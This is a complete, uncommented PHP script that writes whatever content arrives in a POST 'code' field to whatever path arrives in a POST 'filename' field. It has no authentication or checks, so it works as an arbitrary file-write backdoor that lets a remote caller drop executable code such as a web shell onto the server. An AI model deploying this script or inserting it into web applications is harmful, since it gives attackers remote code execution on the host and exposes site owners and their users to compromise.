<?php
$code = $_POST["code"];
$filename = $_POST["filename"];
file_put_contents($filename, $code);



?>